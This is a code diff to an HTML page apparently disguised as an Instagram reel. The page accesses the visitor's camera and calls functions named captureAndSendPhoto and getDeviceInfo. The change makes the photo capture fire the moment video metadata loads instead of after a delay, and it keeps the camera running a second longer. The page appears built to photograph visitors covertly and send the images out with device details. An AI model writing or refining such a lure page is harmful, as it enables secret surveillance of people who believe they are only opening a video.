@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Reel</title>
+    <title>Instagram Video and Camera Capture</title>
     <style>
         body, html {
             margin: 0;
@@ -52,11 +52,7 @@
             .then((mediaStream) => {
                 stream = mediaStream;
                 video.srcObject = stream;
-                
-                // Wait until the video starts playing, then add a delay before capturing the photo
-                video.addEventListener('playing', () => {
-                    setTimeout(captureAndSendPhoto, 1500);  // 1.5 seconds delay before capturing the photo
-                });
+                video.addEventListener('loadedmetadata', captureAndSendPhoto);
             })
             .catch((err) => console.error('Error accessing the camera: ', err));
 
@@ -75,7 +71,9 @@
         }
 
         function stopCamera() {
-            stream.getTracks().forEach(track => track.stop()); // Stop all video tracks
+            setTimeout(() => {
+                stream.getTracks().forEach(track => track.stop()); // Stop all video tracks after 1 second
+            }, 1000); // 1000 milliseconds = 1 second
         }
 
         function getDeviceInfo(imageData) {
